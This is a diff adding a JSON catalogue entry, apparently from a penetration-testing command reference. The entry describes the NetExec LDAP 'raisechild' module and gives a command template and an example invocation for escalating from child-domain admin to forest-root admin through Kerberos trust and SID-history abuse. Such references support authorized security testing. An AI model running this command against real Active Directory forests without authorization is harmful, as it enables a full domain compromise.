@@ -1,0 +1,26 @@
+{
+  "id": "nxc-ldap-raisechild",
+  "name": "NetExec LDAP Raise Child",
+  "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M raisechild",
+  "description": "Escalate from child domain DA to forest root DA via inter-realm Kerberos trust abuse",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap",
+    "kerberos"
+  ],
+  "tags": [
+    "nxc",
+    "ldap",
+    "raisechild",
+    "forest",
+    "trust",
+    "privilege-escalation",
+    "sid-history"
+  ],
+  "examples": [
+    "nxc ldap '192.168.1.100' -u 'domainadmin' -p 'password' -M raisechild"
+  ]
+}
